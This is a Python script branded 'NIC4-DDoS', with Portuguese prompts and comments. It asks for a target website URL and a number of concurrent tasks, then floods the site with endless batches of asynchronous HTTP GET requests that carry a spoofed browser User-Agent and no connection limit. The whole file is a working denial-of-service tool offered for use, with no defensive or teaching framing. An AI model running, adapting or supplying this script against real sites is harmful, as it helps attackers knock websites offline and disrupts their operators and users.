# -*- coding: utf-8 -*-

from pyfiglet import figlet_format
import asyncio
import aiohttp
import sys

print(figlet_format("NIC4-DDoS"))

print("""
⠀⠀⠀⠀⠀⣀⣠⠤⠶⠶⣖⡛⠛⠿⠿⠯⠭⠍⠉⣉⠛⠚⠛⠲⣄⠀⠀⠀⠀⠀
⠀⠀⢀⡴⠋⠁⠀⡉⠁⢐⣒⠒⠈⠁⠀⠀⠀⠈⠁⢂⢅⡂⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠀⣼⠀⠀⠀⠁⠀⠀⠀⠂⠀⠀⠀⠀⢀⣀⣤⣤⣄⡈⠈⠀⠀⠀⠘⣇⠀⠀⠀
⢠⡾⠡⠄⠀⠀⠾⠿⠿⣷⣦⣤⠀⠀⣾⣋⡤⠿⠿⠿⠿⠆⠠⢀⣀⡒⠼⢷⣄⠀
⣿⠊⠊⠶⠶⢦⣄⡄⠀⢀⣿⠀⠀⠀⠈⠁⠀⠀⠙⠳⠦⠶⠞⢋⣍⠉⢳⡄⠈⣧
⢹⣆⡂⢀⣿⠀⠀⡀⢴⣟⠁⠀⢀⣠⣘⢳⡖⠀⠀⣀⣠⡴⠞⠋⣽⠷⢠⠇⠀⣼
⠀⢻⡀⢸⣿⣷⢦⣄⣀⣈⣳⣆⣀⣀⣤⣭⣴⠚⠛⠉⣹⣧⡴⣾⠋⠀⠀⣘⡼⠃
⠀⢸⡇⢸⣷⣿⣤⣏⣉⣙⣏⣉⣹⣁⣀⣠⣼⣶⡾⠟⢻⣇⡼⠁⠀⠀⣰⠋⠀⠀
⠀⢸⡇⠸⣿⡿⣿⢿⡿⢿⣿⠿⠿⣿⠛⠉⠉⢧⠀⣠⡴⠋⠀⠀⠀⣠⠇⠀⠀⠀
⠀⢸⠀⠀⠹⢯⣽⣆⣷⣀⣻⣀⣀⣿⣄⣤⣴⠾⢛⡉⢄⡢⢔⣠⠞⠁⠀⠀⠀⠀
⠀⢸⠀⠀⠀⠢⣀⠀⠈⠉⠉⠉⠉⣉⣀⠠⣐⠦⠑⣊⡥⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡀⠀⠁⠂⠀⠀⠀⠀⠀⠀⠒⠈⠁⣀⡤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠶⢤⣤⣤⣤⣤⡤⠴⠖⠚⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")

# Captura de input protegida por Ctrl+C global
try:
    while True:
        url = input("site que vai ser fodidoXD: ")
        if url.startswith("http://") or url.startswith("https://"):
            break
        print("URL inválida, tente novamente")

    print("URL:", url)

    while True:
        try:
            CONEXOES = int(input("quantidade de threads xd: "))
            if CONEXOES > 0:
                break
            print("Por favor, digite um número maior que zero.")
        except ValueError:
            print("Entrada inválida! Digite apenas números inteiros.")

except KeyboardInterrupt:
    print("\n[*] Script encerrado antes de iniciar.")
    sys.exit()

async def enviar_requisicao(session, url_alvo):
    # Passamos a URL por argumento e removemos o loop interno infinito
    # Cada tarefa fará uma requisição por vez, liberando espaço para as outras rodarem
    try:
        # Definimos apenas os headers essenciais para velocidade
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        
        # timeout reduzido para 1.5s para não prender recursos do seu sistema
        async with session.get(url_alvo, headers=headers, timeout=aiohttp.ClientTimeout(total=1.5)) as response:
            # Baixa apenas os primeiros bytes para poupar sua CPU e rede
            await response.content.read(1024) 
    except asyncio.CancelledError:
        raise # Permite que o asyncio cancele a tarefa corretamente ao fechar
    except Exception:
        pass # Ignora erros de conexão de forma segura sem capturar sinais do sistema

async def iniciar():
    print(f"\n[*] Iniciando com {CONEXOES} threads...")
    print("[*] Pressione Ctrl + C para parar a qualquer momento.\n")

    # Configuração otimizada para alto desempenho de rede no Windows/Linux
    connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300, use_dns_cache=True)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            # Cria o lote de tarefas simultâneas
            tarefas = [enviar_requisicao(session, url) for _ in range(CONEXOES)]
            
            # Executa o lote inteiro em paralelo e aguarda a conclusão antes de disparar o próximo
            await asyncio.gather(*tarefas)
            
            # Uma pausa quase imperceptível de 1 milissegundo para o processador respirar e aceitar o Ctrl+C
            await asyncio.sleep(0.001)

# Ponto de entrada corrigido para lidar perfeitamente com interrupções assíncronas
try:
    asyncio.run(iniciar())
except KeyboardInterrupt:
    print("\n[*] DDoS com sucesso pelo usuário.")
    sys.exit(0)

